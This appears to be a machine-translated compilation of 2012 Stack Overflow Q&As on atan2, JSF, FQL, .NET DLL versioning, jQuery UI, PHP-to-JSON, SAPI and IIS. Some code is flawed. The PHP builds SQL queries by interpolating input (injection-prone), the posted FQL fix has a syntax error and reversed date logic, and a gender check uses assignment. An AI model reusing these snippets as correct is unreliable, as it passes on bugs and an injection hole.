if (angleFromEye < 0) angleFromEye += 360; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-13T13:50:42.810

我认为您的问题在于您从返回值范围`atan2`到所需范围的转换。

`atan2`以弧度为单位给出角度，在 range`[-pi,pi]`中，您希望角度在 range 中以度为单位`[0,360]`。

您的转换为您提供角度范围内的度数`[-180+90,180+90] = [-90,270]`。

```
atan2(...)*(180/Math.PI) + 90 
```

试试这个：

```
atan2(...)*(180/Math.PI) + 180 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-16T20:34:41.413

我最近创建了一个 jQuery 插件，它允许您获取元素的旋转，也可以旋转元素。它也适用于 ie7 和 ie8。这里：[http ://wp-dreams.com/jquery-element-rotation-plugin/](http://wp-dreams.com/jquery-element-rotation-plugin/)

# jsf - JSF - 特立尼达与 MyFaces

> ID：11935513
> 
> 赞同：2
> 
> 时间：2012-08-13T13:42:11.663
> 
> 标签：jsf, myfaces, trinidad

我知道 Trinidad 框架是 MyFaces 项目（谁是 JSF 实现）的扩展。但是，我的 JSF 项目只有 trinidad 依赖项。所以，我问：

*   如果没有 JSF 实现的依赖项，这个项目如何工作？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T14:12:21.040

显然，您手中的项目是针对部署在真正的 Java EE 应用程序服务器上的。

通常，JSF 已经作为[Java EE API](http://docs.oracle.com/javaee/6/api)的一部分由像 Glassfish、JBoss AS、WebSphere、WebLogic 等体面的 Java EE 应用程序服务器提供。Web 应用程序项目根本不需要包含 JSF 库（如当部署到这样的服务器时，它不需要包含 JSP/Servlet/EJB/JPA/etc 库）。

然而，对于像 Tomcat 和 Jetty 这样的准系统 JSP/Servlet 容器，JSF 不是由服务器本身提供的。JSF 要么必须手动安装在这些容器中，要么由 Web 应用程序项目本身提供。

JSF 组件库（如 Trinidad、PrimeFaces、RichFaces 等）不是 Java EE API 的一部分，因此肯定需要由 Web 应用程序项目本身提供。

# android - 查询特定时间范围内的事件的 FQL 事件表

> ID：11935516
> 
> 赞同：-1
> 
> 时间：2012-08-13T13:42:19.240
> 
> 标签：android, sql, sqlite, facebook-fql

我使用 FQL 从 android 上的 facebook 获取事件信息。

我需要参加今天前 1 周和今天后 1 周的活动。

我尝试了下一个代码，但它似乎`DATEADD`是 FQL 上不存在的函数：

```
final Bundle params = new Bundle();
params.putString("method", "fql.query");
params.putString("query",
    "SELECT eid, update_time, start_time, end_time, creator, description, name, location " + 
    "FROM event " + 
    "WHERE eid IN (SELECT eid FROM event_member WHERE uid = me() AND rsvp_status != 'declined') " + 
    "AND start_time<DATEADD(day,7,now()) AND start_time>DATEADD(day,-7,now())");
final String response = "{\"data\":" + _facebook.request(params) + "}";
final JSONObject json = Util.parseJson(response);
final JSONArray data = json.getJSONArray("data"); 
```

我可以用什么代替`DATEADD`？

我发现的另一个问题是他们在[**facebook API**](http://developers.facebook.com/docs/reference/fql/event/)上说该`start_time`字段是一个字符串，这本身就很奇怪......

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-15T14:10:16.690

好的，我找到了解决方案：

```
final Bundle params = new Bundle();
final SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd");
Calendar calendar = Calendar.getInstance();
calendar.add(Calendar.DAY_OF_MONTH, 7);
calendar = Calendar.getInstance();
final String startTime = sdf.format(calendar.getTime());
calendar.add(Calendar.DAY_OF_MONTH, -7);
final String endTime = sdf.format(calendar.getTime());
params.putString("method", "fql.query");
params.putString("query",
    "SELECT eid, update_time, start_time, end_time, creator, description, name, location " + 
    "FROM event " + 
    "WHERE eid IN (SELECT eid FROM event_member WHERE uid = me() AND rsvp_status != 'declined') " );
        + "AND start_time<'" + startTime + "' AND start_time>'" + endTime + "'"); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-13T13:55:30.247

> 但似乎 DATEADD 是 FQL 上不存在的函数

不，它没有。因此，在您的应用程序中自己计算适当的日期值，并将其放入查询中。

> 我发现的另一个问题是他们在 facebook API 上说 start_time 字段是一个字符串，这本身就很奇怪......

这有什么“奇怪”的？ISO-8601 日期不能表示为数值，为此使用特殊的“日期”数据类型在使用 FQL 时不会带来任何好处。

# c# - 编译没有特定版本的.net dll

> ID：11935519
> 
> 赞同：0
> 
> 时间：2012-08-13T13:42:27.767
> 
> 标签：c#, asp.net, .net, vb.net

我的 .net 应用程序中有 2 个自制的 DLL。第一个DLL是通用的，第二个DLL也使用第一个DLL。现在每当我更新第一个 DLL（新版本号）时，我还需要重新编译第二个 DLL。是否可以更新第一个 DLL 而无需重新编译第二个 DLL？谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-13T14:14:23.487

添加对库的引用时，请确保将引用上的“特定版本”属性设置为“False”。只要您不引用特定版本，就没有关系。您将能够重新编译依赖项，而无需重新编译依赖它们的项目。但是，Visual Studio 将自动重新编译您的项目，即使除了依赖项的版本号之外没有任何变化。不过，从技术上讲，这不是必需的，因此您仍然可以针对新库等运行旧 exe。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-13T14:12:32.097

如果您引用了一个程序集，并且该程序集的接口发生了变化，那么是的，您必须重新编译调用代码。但是，如果您有一个包含接口的通用程序集，那么您可以随意更改服务器程序集，因为调用代码仍将仅引用其中包含接口的程序集。

就像 SteveDog 所说，将特定版本属性（您的参考）设置为 False。

# jquery-ui - 如何在鼠标悬停时使用 jqueryui droppable

> ID：11935520
> 
> 赞同：1
> 
> 时间：2012-08-13T13:42:28.393
> 
> 标签：jquery-ui, mouseover, jquery-ui-draggable, jquery-ui-droppable

在网页上，我想显示一个带有文本的小 div，该 div 被截断并用省略号显示，当鼠标悬停时，它应该扩大到更大的尺寸，以便所有文本都可见。然后我希望能够使用 jqueryui 拖放将文本框移动到网格上。当它被拖动和放置时，我希望它再次成为小尺寸。

我试图这样做：

鼠标悬停功能：

```
$(function() {
  $( ".ui-widget-content" ).mouseover(function(){
    $(this).css("width", "200px");
    $(this).css("height", "200px");
  }).mouseout(function(){
    $(this).css("width", "100px");
    $(this).css("height", "40px");            
  })
}) 
```

可拖动功能：

```
 $(function() {
      $( ".ui-widget-content" ).draggable({ snap: "td.chart:not(:first-child)", snapMode: "inner", revert: "invalid", snapTolerance: 40, stack: ".ui-widget-content",
        drag: function( event, ui ) {
          $(this).css("width", "100px");
          $(this).css("height", "40px");
        }
      });
    }); 
```

可丢弃功能：

```
 $(function() {
      $( "td.chart:not(:first-child)" ).droppable({
        accept: ".ui-widget-content",
        drop: function( event, ui ) {
          $("#" + ui.draggable.attr("id") ).css("background-color","#D7F970");
        }
      });
    }); 
```

被拖放的 div：

Lorem Ipsum

我想通过上面的方法，当有人去拖动div时，首先会触发鼠标悬停，放大div，然后dragstart会缩小它，就可以了。但是，我将它放在一个表上（请参阅 droppable 函数中的选择器“td.chart:not(:first-child)”），虽然它适用于表的前三行，但 div 不再捕捉并获取落在第四排和第五排。如果我删除鼠标悬停功能，则不会出现此问题。任何人都明白这里发生了什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T15:23:59.647

看看你的html可能会有所帮助。

这只是一种预感，但也许这只是**您的可拖动项目的大小**太大并且超过一个可放置项目的问题。我建议**尝试更改**可放置元素的容差，看看是否有帮助：

```
$( ".selector" ).droppable({ tolerance: "pointer" }); 
```

**jQuery 文档状态**：

Tolerance 指定用于测试可拖动对象是否“超过”可放置对象的模式。可能的值：

*   fit：draggable 与 droppable 完全重叠
*   intersect: draggable 与 droppable 重叠至少 50%
*   指针：鼠标指针与可放置对象重叠
*   触摸：可拖动与可放置任意数量重叠

# php - PHP 多维数组（或对象）转 JSON

> ID：11935528
> 
> 赞同：1
> 
> 时间：2012-08-13T13:43:04.327
> 
> 标签：php, multidimensional-array, json

我有 2 个数据库表。表 2 与表 1 相关。

在 php 中，我正在构建一个多维数组来保存数据键/值。

因为 PHP 需要具有唯一的“键”，所以我的 JSON 看起来像这样：

```
[
{
    "packs": {
        "9": {
            "characters": {
                "40": {
                    "id": "40",
                    "title": "Jack Bauer",
                    "pic": "68bcbe014c.jpg",
                    "gender": "Male"
                },
                "41": {
                    "id": "41",
                    "title": "Chloe O'Brian",
                    "pic": "ffb6acc8e3.jpg",
                    "gender": "Male"
                },
                "42": {
                    "id": "42",
                    "title": "Tony Almeida",
                    "pic": "23f199e223.jpg",
                    "gender": "Male"
                }
            }
        },
        "7": {
            "characters": {
                "7": {
                    "id": "7",
                    "title": "Elvis Presley",
                    "pic": "78300767ad.jpg",
                    "gender": "Male"
                },
                "16": {
                    "id": "16",
                    "title": "Madonna",
                    "pic": "70663a42f7.jpg",
                    "gender": "Male"
                },
                "17": {
                    "id": "17",
                    "title": "Lady Gaga",
                    "pic": "c5099c619b.jpg",
                    "gender": "Male"
                },
                "21": {
                    "id": "21",
                    "title": "Pink Floyd",
                    "pic": "52ddce314a.jpg",
                    "gender": "Male"
                },
                "22": {
                    "id": "22",
                    "title": "Led Zeppelin",
                    "pic": "84cd58ada3.jpg",
                    "gender": "Male"
                },
                "31": {
                    "id": "31",
                    "title": "The Beatles",
                    "pic": "bd22a4d648.jpg",
                    "gender": "Male"
                },
                "32": {
                    "id": "32",
                    "title": "Foo Fighters",
                    "pic": "250fb6ecec.jpg",
                    "gender": "Male"
                },
                "33": {
                    "id": "33",
                    "title": "Bananarama",
                    "pic": "da7c2b56cf.jpg",
                    "gender": "Male"
                },
                "35": {
                    "id": "35",
                    "title": "Boney-M",
                    "pic": "3cbdada38b.jpg",
                    "gender": "Male"
                },
                "38": {
                    "id": "38",
                    "title": "The Spice Girls",
                    "pic": "4751f0fbb7.jpeg",
                    "gender": "Male"
                },
                "39": {
                    "id": "39",
                    "title": "Girls Aloud",
                    "pic": "644dcf71ca.jpg",
                    "gender": "Male"
                }
            }
        },
        "8": {
            "characters": {
                "9": {
                    "id": "9",
                    "title": "Keith Lemon",
                    "pic": "ff6ef10853.jpg.jpg",
                    "gender": "Male"
                },
                "23": {
                    "id": "23",
                    "title": "Fearne Cotton",
                    "pic": "0d038b6516.jpg",
                    "gender": "Male"
                },
                "24": {
                    "id": "24",
                    "title": "Holly Willoughby",
                    "pic": "836fc4184c.jpg",
                    "gender": "Male"
                },
                "30": {
                    "id": "30",
                    "title": "Rufus Hound",
                    "pic": "062bee9602.jpg",
                    "gender": "Male"
                }
            }
        },
        "3": {
            "characters": {
                "5": {
                    "id": "5",
                    "title": "Tom Cruise",
                    "pic": "ff296fafb9.jpg",
                    "gender": "Male"
                },
                "10": {
                    "id": "10",
                    "title": "Linda Lovelace",
                    "pic": "ac1bea43d3.jpg",
                    "gender": "Male"
                },
                "15": {
                    "id": "15",
                    "title": "Gwyneth Paltrow",
                    "pic": "43a22d7240.jpg",
                    "gender": "Male"
                },
                "44": {
                    "id": "44",
                    "title": "Errol Flynn",
                    "pic": "cea17c1275.jpg",
                    "gender": "Male"
                },
                "45": {
                    "id": "45",
                    "title": "Halle Berry",
                    "pic": "752b5c92c5.jpg",
                    "gender": "Male"
                }
            }
        },
        "2": {
            "characters": {
                "4": {
                    "id": "4",
                    "title": "Donald Duck",
                    "pic": "8d367f41b1.jpg",
                    "gender": "Male"
                },
                "6": {
                    "id": "6",
                    "title": "Mickey Mouse",
                    "pic": "8d9629c115.jpg",
                    "gender": "Male"
                },
                "28": {
                    "id": "28",
                    "title": "Pluto",
                    "pic": "fb2c0e2dd0.jpg",
                    "gender": "Male"
                },
                "29": {
                    "id": "29",
                    "title": "Minnie Mouse",
                    "pic": "378760ff77.jpg",
                    "gender": "Male"
                },
                "36": {
                    "id": "36",
                    "title": "Cinderella",
                    "pic": "a7e4888213.jpg",
                    "gender": "Male"
                },
                "37": {
                    "id": "37",
                    "title": "Snow White",
                    "pic": "a9cf05a857.jpg",
                    "gender": "Male"
                }
            }
        },
        "4": {
            "characters": {
                "3": {
                    "id": "3",
                    "title": "Bill Clinton",
                    "pic": "03c6567ddb.jpg",
                    "gender": "Male"
                },
                "11": {
                    "id": "11",
                    "title": "Margaret Thatcher",
                    "pic": "91c9fa9fd0.jpg",
                    "gender": "Male"
                },
                "13": {
                    "id": "13",
                    "title": "David Cameron",
                    "pic": "a689984360.jpg",
                    "gender": "Male"
                },
                "14": {
                    "id": "14",
                    "title": "Nick Clegg",
                    "pic": "3243e298e5.jpg",
                    "gender": "Male"
                },
                "26": {
                    "id": "26",
                    "title": "George Bush JR",
                    "pic": "46296f6b0e.jpg",
                    "gender": "Male"
                },
                "27": {
                    "id": "27",
                    "title": "Ed Milliband",
                    "pic": "66f1449994.jpg",
                    "gender": "Male"
                }
            }
        },
        "5": {
            "characters": {
                "8": {
                    "id": "8",
                    "title": "Stephen Hawking",
                    "pic": "b8c4f17530.jpg",
                    "gender": "Male"
                },
                "18": {
                    "id": "18",
                    "title": "Alan Turing",
                    "pic": "82b4d84e35.jpg",
                    "gender": "Male"
                },
                "19": {
                    "id": "19",
                    "title": "Albert Einstein",
                    "pic": "a6cd74dbaa.jpg",
                    "gender": "Male"
                },
                "34": {
                    "id": "34",
                    "title": "Brian Cox (prof)",
                    "pic": "92b6005de9.jpg",
                    "gender": "Male"
                },
                "43": {
                    "id": "43",
                    "title": "Richard Feynman",
                    "pic": "5de10d1128.jpg",
                    "gender": "Male"
                }
            }
        },
        "6": {
            "characters": {
                "12": {
                    "id": "12",
                    "title": "Jeff Koons",
                    "pic": "8e3ca5f497.jpg",
                    "gender": "Male"
                },
                "20": {
                    "id": "20",
                    "title": "Salvador Dali",
                    "pic": "b5bafb7934.jpg",
                    "gender": "Male"
                },
                "25": {
                    "id": "25",
                    "title": "Rembrandt",
                    "pic": "73e2710029.jpg",
                    "gender": "Male"
                },
                "49": {
                    "id": "49",
                    "title": "Vincent Van Gough",
                    "pic": "6ee455ab28.jpg",
                    "gender": "Male"
                }
            }
        }
    }
} 
```

]

我正在尝试解决我的 iOS 开发人员想要排序的问题......显然 "{"packs":{"9": " 9 是错误的并且不遵循 key:value JSON 结构。我到底如何使用 DB 表 1 中每个结果集的唯一标识符创建正确的 PHP 数组或对象？

结果的结构应该是这样的：

data_db_1:1

data_db_2:id data_db_2:title data_db_2:pic data_db_2:gender

data_db_1:2

data_db_2:id data_db_2:title data_db_2:pic data_db_2:gender

data_db_1:3

data_db_2:id data_db_2:title data_db_2:pic data_db_2:gender

data_db_1:4 data_db_2:id data_db_2:title data_db_2:pic data_db_2:gender

看起来像这样：

```
 {
"id": "9",
"title": "24",
"credits": "100",
"character": [
    {
        "id": "50",
        "title": "Jack Bauer",
        "pic": "68bcbe014c.jpg",
        "gender": "Male"
    },
    {
        "id": "50",
        "title": "Jack Bauer",
        "pic": "68bcbe014c.jpg",
        "gender": "Male"
    },
    {
        "id": "50",
        "title": "Jack Bauer",
        "pic": "68bcbe014c.jpg",
        "gender": "Male"
    },
    {
        "id": "50",
        "title": "Jack Bauer",
        "pic": "68bcbe014c.jpg",
        "gender": "Male"
    }
] 
```

}

我在网上找不到与此相关的分配。我能想到解决它的唯一方法是使用 json_encode() 和 echo 以及一堆 concat 分别从 PHP 数组中创建每个部分。当然 json_encode() 应该能够从一个简单的 php 数组、一个复杂的 php 多维数组或一个 PHP 对象创建正确的 JSON 而不费吹灰之力？？？

* * *

我的 php 函数按要求执行此操作：

```
$data_ar = output_pack_data($pack_id);

echo "[".json_encode($data_ar)."]";         // first bit of dirty here

function output_pack_data($pack_id = false)
{
global $db;

$output_keys = true; //false;

if($pack_id != false)
{
    $q = "WHERE id='{$pack_id}' AND active = '1'";                                                          // select the relevant pack ID
}
else
{
    $q = "WHERE active='1' ORDER BY order_num ASC";                                                         // select all pack ids
}

$rs = $db->rs("whoami_packs",$q);

$pack_obj = new stdClass();                                                                                 // declare new std class object here......

$data = array();                                                                                            // prep new array to hold the data

while($rs && $r = $db->fetch($rs))                                                                          // loop thorugh each pack id
{
    $pack_obj->packs->id = $r->id;                                                                      // add the pack title
    $pack_obj->packs->title = $r->title;                                                                        // add the pack title
    $pack_obj->packs->credits = $r->credits;                                                                    // add the required credits to access 

    $packs_rs = $db->rs("whoami_characters","WHERE pack_id='{$r->id}' AND active = '1'");                   // get the character data relevant for this pack

    $i=0;

    while($packs_rs && $pack_r = $db->fetch($packs_rs))                                                     // loop through the character data
    {   
        $id = $r->id;

        if($output_keys == false)
        {
            $data['packs'][$r->id]['characters'][$pack_r->id][$pack_r->title][$pack_r->pic][$pack_r->gender] = true;    // build the array
        }
        else
        {
            $data['packs'][$r->id]['characters'][$pack_r->id]['id'] = $pack_r->id;                  // build the array
            $data['packs'][$r->id]['characters'][$pack_r->id]['title'] = str_out($pack_r->title);                   // build the array
            $data['packs'][$r->id]['characters'][$pack_r->id]['pic'] = $pack_r->pic;
            $data['packs'][$r->id]['characters'][$pack_r->id]['gender'] = ($pack_r->gender = 'm') ? "Male" : "Female";
        }
    }
}

return $data;                                                                                               // return the array 
```

}

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T15:00:53.297

函数中有一些多余的代码。当你有非连续（数字）索引时，json_encode 不会使用 [x,y,z] 编码，而是使用对象表示法。
显然，您的同事希望将 ID 作为每个对象的属性，而不是作为对象的键。因此，只需通过其 id 删除引用数组元素，但首先创建完整的数组，然后通过 $parent[] 将其附加到其父级。通过这种方式，您可以获得一个具有连续数字 id 的数组 -> json_encode() 创建一个数组表示法。
（未经测试，我懒得从原始问题中提供的 json 输出构建 sql 测试数据）

```
function output_pack_data($pack_id=false)
{
    global $db;
    $data = array();

    if($pack_id != false) {
        $q = "WHERE id='{$pack_id}' AND active = '1'";
    }
    else {
        $q = "WHERE active='1' ORDER BY order_num ASC";
    }

    $rs_packs = $db->rs("whoami_packs", $q);    
    while($rs_packs && ($rec_pack=$db->fetch($rs_packs)) ) {
        $pack = array(
            'id'=>$rec_pack->id,
            'title'=>$rec_pack->title,
            'credits'=>$rec_pack->credits,
            'characters'=>array()
        );

        $rs_chars = $db->rs("whoami_characters","WHERE pack_id='{$pack->id}' AND active = '1'");
        while($rs_chars && ($rec_char=$db->fetch($rs_chars)) ) {
            $pack['characters'][] = array(
                'id' => $rec_char->id,
                'title' => str_out($rec_char->title),
                'pic' => $rec_char->pic,
                'gender' => 'm'==$rec_char->gender ? "Male" : "Female"
            );
        }
        $data[] = $pack;
    }

    return $data;
} 
```

请阅读[https://en.wikipedia.org/wiki/Join_%28SQL%29](https://en.wikipedia.org/wiki/Join_%28SQL%29)和[http://www.w3schools.com/sql/sql_join.asp](http://www.w3schools.com/sql/sql_join.asp)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-13T14:39:10.137

抱歉，这是评论而不是答案（再次）。

我认为 iOS 开发人员（例如我自己）所说的是您使用每个对象的 id 来定义每个对象，而不是键。

您的示例和开发人员的预期输出都是正确的，但是问题在于信息的实际结构。

如果您前往[http://json.org/example.html](http://json.org/example.html)查看 JSON 数据结构的一些示例，可能会更清楚一些。

让我们在 XML 中看看这个。如果将以下 JSON 转换为 XML：

```
[
{
    "1": {
        "id": "1",
        "title": "Jack Bauer",
        "pic": "68bcbe014c.jpg",
        "gender": "Male"
    }
},
{
    "2": {
        "id": "2",
        "title": "Jack Bauer",
        "pic": "68bcbe014c.jpg",
        "gender": "Male"
    }
}
] 
```

您将得到：

```
<?xml version="1.0" encoding="UTF-8" ?>
    <1>
        <id>1</id>
        <title>Jack Bauer</title>
        <pic>68bcbe014c.jpg</pic>
        <gender>Male</gender>
    </1>
    <2>
        <id>2</id>
        <title>Jack Bauer</title>
        <pic>68bcbe014c.jpg</pic>
        <gender>Male</gender>
    </2>
</xml> 
```

简而言之，虽然在这两种情况下都结构正确，但数据放置不正确。<1> 和 <2> 节点应该是同一个key，这个原则遵循大多数标准（比如RSS）。

查看您的开发人员的要求，他想要（在 JSON 和 XML 示例中）：

```
{
"character": [
    {
        "id": "1",
        "title": "Jack Bauer",
        "pic": "68bcbe014c.jpg",
        "gender": "Male"
    },
    {
        "id": "2",
        "title": "Jack Bauer",
        "pic": "68bcbe014c.jpg",
        "gender": "Male"
    }
]
} 
```

并作为 XML：

```
<?xml version="1.0" encoding="UTF-8" ?>
<character>
    <id>1</id>
    <title>Jack Bauer</title>
    <pic>68bcbe014c.jpg</pic>
    <gender>Male</gender>
</character>
<character>
    <id>2</id>
    <title>Jack Bauer</title>
    <pic>68bcbe014c.jpg</pic>
    <gender>Male</gender>
</character>
</xml> 
```

第二个示例的结构显然更有效，因为键（字符）定义了每个值，而不是每个值本身的 id。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-13T19:22:36.803

因此，如果 json_encode() 是一个简单的递增计数器，它们似乎会忽略键值......

这个功能：

```
function output_pack_data($pack_id = false)
{
global $db;

$output_keys = true; //false;

if($pack_id != false)
{
    $q = "WHERE id='{$pack_id}' AND active = '1'";                                                          // select the relevant pack ID
}
else
{
    $q = "WHERE active='1' ORDER BY order_num ASC";                                                         // select all pack ids
}

$rs = $db->rs("whoami_packs",$q);

$data = array();                                                                                            // prep new array to hold the data

$i = 0;    // AHA!

while($rs && $r = $db->fetch($rs))                                                                          // loop through each pack id
{
    $data[$i]['pack_id'] = $r->id;  
    $data[$i]['title'] = $r->title;                                                                     // add the pack title
    $data[$i]['credits'] = $r->credits;                                                                 // add the required credits to access 

    $chars_rs = $db->rs("whoami_characters","WHERE pack_id='{$r->id}' AND active = '1'");                   // get the character data relevant for this pack

    $ii = 0;           // AHA!

    while($chars_rs && $char_r = $db->fetch($chars_rs))                                                     // loop through the character data
    {   
        if($output_keys == false)
        {
            $data[$i]['characters'][$ii][$char_r->title][$char_r->pic][$char_r->gender] = true; // build the array
        }
        else
        {
            $data[(int)$i]['characters'][(int)$ii]['id'] = str_out($char_r->id);                    // build the array
            $data[(int)$i]['characters'][(int)$ii]['title'] = str_out($char_r->title);                  // build the array
            $data[(int)$i]['characters'][(int)$ii]['pic'] = $char_r->pic;
            $data[(int)$i]['characters'][(int)$ii]['gender'] = ($char_r->gender = 'm') ? "Male" : "Female";
        }
        $ii++;
    }

    $i++;
}

return $data;                                                                                               // return the array 
```

}

将返回所需的结果。奇怪的是，文档中没有提到它！哦，好吧，现在排序！希望这可以帮助其他人解决这个问题......注意使用 (int) 以确保 $i 或 $ii 计数器是正确的整数。在这种情况下使用 DB ID 将不起作用，它们将被添加到输出中。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-05-18T01:57:36.367

使用该选项`JSON_FORCE_OBJECT`（自 PHP 5.3.0 起可用，请参阅[此处](http://www.php.net/manual/en/json.constants.php)）将强制`json_encode`创建一个有效的 JSON 对象

# c# - C# SAPI 5.4 语言？

> ID：11935533
> 
> 赞同：1
> 
> 时间：2012-08-13T13:43:18.247
> 
> 标签：c#, speech-recognition, sapi, text-to-speech

我已经制作了一个使用 SAPI 5.4 识别语音的简单程序，我想问一下我是否可以在 TTS 和 ASR 中添加更多语言，谢谢 这是我制作的代码，任何人都需要看看

```
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using SpeechLib;
using System.Globalization;
using System.Speech.Recognition;

namespace WindowsFormsApplication1
{
    public partial class Form1 : Form
    {

        // Speech Recognition Object
        SpSharedRecoContext listener;

        // Grammar object
        ISpeechRecoGrammar grammar;

        public Form1()
        {
            InitializeComponent();
        }
        public string ps;
        private void button1_Click(object sender, EventArgs e)
        {

       if (btnListen.Text == "Start Listening")
       {
              try
                {

                    listener = new SpeechLib.SpSharedRecoContext();
                    listener.Recognition += new _ISpeechRecoContextEvents_RecognitionEventHandler(listener_Reco);
                    grammar = listener.CreateGrammar(0);
                    grammar.DictationLoad("", SpeechLoadOption.SLOStatic);
                    grammar.DictationSetState(SpeechRuleState.SGDSActive);
                    btnListen.Text = "Stop Listening";
                  if (ps == "1")
                  {
                    listener.Resume();
                    ps = "0";  
                  }
              }
              catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
       }
       else if (btnListen.Text == "Stop Listening")
       {
           listener.Pause();
           btnListen.Text = "Start Listening";
           if (ps == "0")
           {
           ps = "1";
           }
          }

            }
        public void listener_Reco(int StreamNumber, object StreamPosition, SpeechRecognitionType RecognitionType, ISpeechRecoResult Result)
        {
            string heard = Result.PhraseInfo.GetText(0, -1, true);
            textBox1.Text += " " + heard;

        }

        private void button1_Click_1(object sender, EventArgs e)
        {
            WinXP winxp = new WinXP();
            winxp.Show();
            this.Hide();
        }

        string getOSInfo()
        {
            //Get Operating system information.
            OperatingSystem os = Environment.OSVersion;
            //Get version information about the os.
            Version vs = os.Version;

            //Variable to hold our return value
            string operatingSystem = "";

            if (os.Platform == PlatformID.Win32Windows)
            {
                //This is a pre-NT version of Windows
                switch (vs.Minor)
                {
                    case 0:
                        operatingSystem = "95";
                        break;
                    case 10:
                        if (vs.Revision.ToString() == "2222A")
                            operatingSystem = "98SE";
                        else
                            operatingSystem = "98";
                        break;
                    case 90:
                        operatingSystem = "Me";
                        break;
                    default:
                        break;
                }
            }
            else if (os.Platform == PlatformID.Win32NT)
            {
                switch (vs.Major)
                {
                    case 3:
                        operatingSystem = "NT 3.51";
                        break;
                    case 4:
                        operatingSystem = "NT 4.0";
                        break;
                    case 5:
                        if (vs.Minor == 0)
                            operatingSystem = "2000";
                        else
                            operatingSystem = "XP";
                        break;
                    case 6:
                        if (vs.Minor == 0)
                            operatingSystem = "Vista";
                        else
                            operatingSystem = "7";
                        break;
                    default:
                        break;
                }
            }
            //Make sure we actually got something in our OS check
            //We don't want to just return " Service Pack 2" or " 32-bit"
            //That information is useless without the OS version.
            if (operatingSystem != "")
            {
                //Got something.  Let's prepend "Windows" and get more info.
                operatingSystem = "Windows " + operatingSystem;
                //See if there's a service pack installed.
                if (os.ServicePack != "")
                {
                    //Append it to the OS name.  i.e. "Windows XP Service Pack 3"
                    operatingSystem += " " + os.ServicePack;
                }
                //Append the OS architecture.  i.e. "Windows XP Service Pack 3 32-bit"
                operatingSystem += " " + getOSArchitecture().ToString() + "-bit";
            }
            //Return the information we've gathered.
            return operatingSystem;
        }

        int getOSArchitecture()
        {
            string pa = Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");
            return ((String.IsNullOrEmpty(pa) || String.Compare(pa, 0, "x86", 0, 3, true) == 0) ? 32 : 64);
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            string OS = getOSInfo();
            if (OS.Contains("XP"))
            {
                btnXP.Visible = true;
            }
            else
            {
                btnXP.Visible = false;
                btnYes2.Visible = true;
                btnNo2.Visible = true;
                btnNo.Visible = false;
                btnYes.Visible = false;
            }
        }

    }
} 
```

***PS我在恢复识别器时遇到了问题***

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-13T23:29:50.657

这在一定程度上取决于您对识别器所做的工作。是的，桌面操作系统（Windows Vista、7）带有一个与操作系统语言版本相关的识别器。但是，微软还免费（不需要武器）赠送了一个用于服务器的识别引擎（但也可以用于桌面操作系统）。有许多不同的语言可供免费使用。

桌面和服务器识别器库之间存在一些差异。我的理解是桌面识别器可以针对特定的说话者进行训练，支持更高质量的音频输入，并包含听写语法。这些专为一次只需要一个扬声器的桌面使用而设计。服务器识别器专为电话质量音频而设计，不可训练，并且需要有限的语法（无需听写）。服务器引擎专为更大规模和多个同时发言者（如 IVR 或 SpeechServer 应用程序）而设计。

看：

*   语言包 - [http://www.microsoft.com/en-us/download/details.aspx?id=27224](http://www.microsoft.com/en-us/download/details.aspx?id=27224)
*   运行时引擎 - [http://www.microsoft.com/en-us/download/details.aspx?id=27225](http://www.microsoft.com/en-us/download/details.aspx?id=27225)
*   SDK - [http://www.microsoft.com/en-us/download/details.aspx?id=27226](http://www.microsoft.com/en-us/download/details.aspx?id=27226)
*   MSDN 文档 - [http://msdn.microsoft.com/en-us/library/dd266409](http://msdn.microsoft.com/en-us/library/dd266409)

有关一些背景信息，请参阅[System.Speech.Recognition 和 Microsoft.Speech.Recognition 之间有什么区别？](https://stackoverflow.com/questions/2977338/what-is-the-difference-between-system-speech-recognition-and-microsoft-speech-re)

# iis - IIS6 和 .Net 4.5？

> ID：11935534
> 
> 赞同：13
> 
> 时间：2012-08-13T13:43:18.203
> 
> 标签：iis, iis-6, .net-4.5

过去，.NET 框架一直独立于 IIS 版本，并且与 IIS 6+ 一起使用。

.NET 4.5 是否支持 IIS 6？

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2012-08-13T13:45:47.753

IIS 6 是 Windows Server 2003（技术上是 XP 64 位）的一部分。

[.NET Framework 4.5 系统要求](http://msdn.microsoft.com/en-us/library/8z6watww(v=vs.110).aspx)表明不支持 Server 2003，即 IIS 6 。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-08-28T19:34:40.337

不想放弃最后一个答案，这可能是 MS 网站上的错字，但在寻找相同的问题时，我发现了这个。

[http://msdn.microsoft.com/en-us/library/ms733890.aspx](http://msdn.microsoft.com/en-us/library/ms733890.aspx)

“WCF 也可以安装在 Windows XP SP2、Windows Server 2003 R2 或 Windows Server 2003 SP1 上”

那就是我在顶部选择了.net 4.5。

我在想错字..但有希望；）

# c# - 按下组合键时显示 UnVisibleForm

> ID：11935538
> 
> 赞同：1
> 
> 时间：2012-08-13T13:43:25.650
> 
> 标签：c#

我创建了简单的 Windows 应用程序。当它运行时，我将其 Visible 属性设置为 false；现在我想在按下组合键时使其可见

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T13:46:26.600

您需要创建[Keyboard Hook](http://www.codeproject.com/Articles/7294/Processing-Global-Mouse-and-Keyboard-Hooks-in-C)。如文章中所述，[CodePlex 上](http://globalmousekeyhook.codeplex.com/)有一个非常有用的项目，您可以使用它来解决您的问题。

